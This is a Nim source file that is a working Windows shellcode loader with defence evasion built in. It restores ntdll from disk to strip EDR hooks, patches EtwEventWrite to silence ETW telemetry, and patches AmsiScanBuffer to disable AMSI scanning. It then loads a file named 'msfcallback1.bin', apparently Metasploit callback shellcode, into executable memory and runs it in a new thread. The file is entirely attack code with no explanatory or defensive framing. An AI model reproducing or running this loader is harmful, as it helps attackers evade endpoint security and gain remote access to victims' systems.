import winim
import strutils
import ptr_math
import strformat
import dynlib

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

when defined amd64:
    echo "[*] Running in x64 process"
    const etwpatch: array[1, byte] = [byte 0xc3]

    echo "[*] Running in x64 process"
    const amsipatch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    echo "[*] Running in x86 process"
    const etwpatch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    const amsipatch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

proc PatchETW(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        echo "[X] Failed to load ntdll.dll"
        return disabled

    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'EtwEventWrite'"
        return disabled

    if VirtualProtect(cs, etwpatch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr etwpatch, etwpatch.len)
        VirtualProtect(cs, etwpatch.len, op, addr t)
        disabled = true

    return disabled

proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, amsipatch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr amsipatch, amsipatch.len)
        VirtualProtect(cs, amsipatch.len, op, addr t)
        disabled = true

    return disabled

proc ntdllunhook(): bool =
  let low: uint16 = 0
  var 
      processH = GetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = GetModuleHandleA("ntdll.dll")
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo fmt"Could not create file mapping object ({GetLastError()})."
    return false
  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo fmt"Could not map view of file ({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection : DWORD = 0
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
            echo fmt"Failed calling VirtualProtect ({GetLastError()})."
            return false
          copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
            echo fmt"Failed resetting memory back to it's orignal protections ({GetLastError()})."
            return false  
  CloseHandle(processH)
  CloseHandle(ntdllFile)
  CloseHandle(ntdllMapping)
  FreeLibrary(ntdllModule)
  return true
          

when isMainModule:
  var result = ntdllunhook()
  echo fmt"[*] Unhooked Ntdll: {bool(result)}"

  var etwSuccess = PatchETW()
  echo fmt"[*] ETW blocked by patch: {bool(etwSuccess)}"

  var amsiSuccess = PatchAmsi()
  echo fmt"[*] AMSI disabled: {bool(amsiSuccess)}"

  let scFile = readFile("msfcallback1.bin")
  let shellcode = scFile.toByteSeq

  let scLen = cast[SIZE_T](shellcode.len)
  let buffer = VirtualAlloc(cast[LPVOID](0), scLen, cast[DWORD](0x00001000), cast[DWORD](0x40))
  try:
    copyMem(buffer, unsafeAddr shellcode[0], scLen)
  except:
    echo "[*] CopyMem failed!"
  try:
    let tHandle = CreateThread(cast[LPSECURITY_ATTRIBUTES](NULL), cast[SIZE_T](0), cast[LPTHREAD_START_ROUTINE](buffer), cast[LPVOID](NULL), cast[DWORD](0), cast[LPDWORD](NULL))
    WaitForSingleObject(tHandle, cast[DWORD](0xFFFFFFFF))
  except:
    echo "[*] CreateThread failed!"